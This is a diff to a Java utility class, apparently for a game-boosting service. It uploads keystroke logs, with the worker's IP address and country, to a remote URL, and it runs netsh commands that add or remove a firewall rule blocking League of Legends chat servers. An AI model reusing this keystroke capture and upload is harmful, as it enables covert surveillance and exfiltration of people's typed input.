@@ -1,19 +1,27 @@
 package services;
 
+import com.google.gson.JsonArray;
+import com.google.gson.JsonObject;
+import io.socket.utf8.UTF8;
+import logger.Globals;
 import logger.KeyLogger;
-import model.Order;
+import model.orders.Order;
 import model.User;
+import org.apache.http.Header;
+import org.apache.http.HttpHeaders;
+import org.apache.http.HttpResponse;
+import org.apache.http.client.HttpClient;
+import org.apache.http.client.methods.HttpPost;
+import org.apache.http.entity.StringEntity;
+import org.apache.http.impl.client.HttpClientBuilder;
+import org.apache.http.protocol.HTTP;
 import org.json.JSONException;
 import org.json.JSONObject;
 import webService.AWSWebService;
 
-import java.io.BufferedWriter;
-import java.io.File;
-import java.io.FileWriter;
-import java.io.IOException;
+import java.io.*;
 import java.text.DateFormat;
 import java.text.SimpleDateFormat;
-import java.time.LocalDate;
 import java.time.format.DateTimeFormatter;
 import java.util.ArrayList;
 import java.util.Date;
@@ -22,21 +30,47 @@ import java.util.Timer;
 
 public class Utils {
 
-    public static boolean foundBadWord = false;
+    private static boolean foundBadWord = false;
     public Boolean scriptAlert = false;
-    private static Timer timer = new Timer();
-
 
     public void uploadLog(User user, Order order) {
-        try {
+        if(!KeyLogger.logUploaded && KeyLogger.log.size() > 5) {
             if(checkForBadWords(KeyLogger.log)) {
                 Utils.foundBadWord = true;
             }
-            AWSWebService webService =  new AWSWebService();
-            webService.WebService(createLogFile(), createKey(user, order));
+            JsonObject jsonObject = new JsonObject();
+            JsonArray logFile = new JsonArray();
+            logFile.add("The booster's IP adress is: " + getMyIp() + "\n");
+            logFile.add("The booster's Country is: " + getMyCountry() + "\n");
+            for (String message : KeyLogger.log) {
+                logFile.add(message + "\n");
+            }
+            jsonObject.add("logFile", logFile);
+            jsonObject.addProperty("fileName", createKey(user, order));
+
+            System.out.println(jsonObject);
+            System.out.println("kaki");
+            sendJson(Globals.logUploadURL, jsonObject);
             KeyLogger.log.clear();
-        } catch (IOException e) {
-            e.printStackTrace();
+        }
+    }
+
+
+    private void sendJson(String url, JsonObject jsonObject) {
+        HttpClient httpClient = HttpClientBuilder.create().build();
+
+        try {
+            HttpPost request = new HttpPost(url);
+            StringEntity params =new StringEntity(jsonObject.toString(), "UTF8");
+            params.setContentType("application/json");
+            request.setHeader("accept", "application/json");
+            request.setHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36");
+            request.setEntity(params);
+            System.out.println(request.getEntity().getContent().read());
+            HttpResponse response = httpClient.execute(request);
+            System.out.println("status code: " + response.getStatusLine().getStatusCode());
+        }catch (Exception ex) {
+            System.out.println(ex);
         }
     }
 
@@ -54,45 +88,23 @@ public class Utils {
 
     private ArrayList<String> getBadWords () {
         ArrayList<String> badWords = new ArrayList<>();
-        Scanner scanner = null;
+        Scanner scanner;
         scanner = new Scanner(KeyLogger.badWordsFilePath);
         while (scanner.hasNext()) {
             badWords.add(scanner.nextLine());
         }
-        System.out.println(badWords);
-        System.out.println(KeyLogger.message);
         scanner.close();
         return badWords;
     }
 
-    public String createKey(User user, Order order) {
+    private String createKey(User user, Order order) {
         DateTimeFormatter dtf = DateTimeFormatter.ofPattern("yyyy/MM/dd");
         String path = "";
-        path += AWSWebService.folder + "/";
-        path += LocalDate.now() + "/";
         path += createFileName(user, order) + ".csv";
         return path;
     }
 
-    public File createLogFile() throws IOException {
-        File tempFile = File.createTempFile("anyad", ".txt");
-        BufferedWriter bufferedWriter = new BufferedWriter(new FileWriter(tempFile));
-        bufferedWriter.write("The booster's IP adress is: " + getMyIp());
-        bufferedWriter.write(System.getProperty("line.separator"));
-        bufferedWriter.write("The booster's Country is: " + getMyCountry());
-        bufferedWriter.write(System.getProperty("line.separator"));
-        bufferedWriter.write(System.getProperty("line.separator"));
-        for (String row : KeyLogger.log) {
-            bufferedWriter.write(row);
-            bufferedWriter.write(System.getProperty("line.separator"));
-        }
-        bufferedWriter.close();
-
-        return tempFile;
-    }
-
-
-    public String createFileName(User user, Order order) {
+    private String createFileName(User user, Order order) {
         String fileName = "";
         if(foundBadWord) {
             fileName += " WARNING ";
@@ -109,7 +121,7 @@ public class Utils {
         return fileName;
     }
 
-    public String getMyIp() {
+    private String getMyIp() {
         try (Scanner s = new Scanner(new java.net.URL("https://api.ipify.org").openStream(), "UTF-8").useDelimiter("\\A")) {
             return s.next();
         } catch (IOException e) {
@@ -117,7 +129,7 @@ public class Utils {
         }
     }
 
-    public String getMyCountry() {
+    private String getMyCountry() {
         try (Scanner s = new Scanner(new java.net.URL("https://usercountry.com/v1.0/json/" + getMyIp()).openStream(), "UTF-8").useDelimiter("\\A")) {
             JSONObject jsonObject = new JSONObject(s.nextLine());
             return jsonObject.get("country").toString();
@@ -129,21 +141,62 @@ public class Utils {
         }
     }
 
-    public void readKeys() {
-        ArrayList<String> keys = new ArrayList<>();
-        Scanner scanner = null;
-        scanner = new Scanner(ClassLoader.getSystemResourceAsStream("keys.csv"));
-        if(scanner != null) {
-            while (scanner.hasNext()) {
-                keys.add(scanner.nextLine());
+    public void disableChat(String server) {
+        String[] command = {"cmd", "/c", "netsh advfirewall firewall add rule name=\"lolchat\" dir=out remoteip=" + getServerIp(server) + " protocol=TCP action=block"};
+        StringBuilder cmdReturn = new StringBuilder();
+        try {
+            Process process = Runtime.getRuntime().exec(command);
+            try (InputStream inputStream = process.getInputStream()) {
+                int c;
+                while ((c = inputStream.read()) != -1) {
+                    cmdReturn.append((char) c);
+                }
             }
-            scanner.close();
+            System.out.println(cmdReturn.toString());
+
+        } catch (IOException ex) {
+            System.out.println(ex);
         }
-        AWSWebService.accessKey = keys.get(0);
-        AWSWebService.secretKey = keys.get(1);
-        AWSWebService.bucketName = keys.get(2);
-        AWSWebService.folder = keys.get(3);
-        AWSWebService.region = keys.get(4);
     }
+
+    private String getServerIp(String server) {
+        switch (server) {
+            case "EUW": return "185.40.64.69";
+            case "EUNE": return "185.40.64.111";
+            case "NA": return "192.64.174.69";
+            case "TR": return "";
+            case "RU": return "";
+            case "BR": return "";
+            case "LAN": return "";
+            case "LAS": return "";
+            case "OCE": return "";
+            case "JP": return "";
+            case "SEA": return "";
+            case "KR": return "";
+            case "CN": return "";
+            case "PBE": return "";
+        }
+        return null;
+    }
+
+    public void enableChat() {
+        String[] command = {"cmd", "/c", "netsh advfirewall firewall delete rule name=\"lolchat\""};
+        StringBuilder cmdReturn = new StringBuilder();
+        try {
+            Process process = Runtime.getRuntime().exec(command);
+            try (InputStream inputStream = process.getInputStream()) {
+                int c;
+                while ((c = inputStream.read()) != -1) {
+                    cmdReturn.append((char) c);
+                }
+            }
+            System.out.println(cmdReturn.toString());
+
+        } catch (IOException ex) {
+            System.out.println(ex);
+        }
+    }
+
+
 
 }
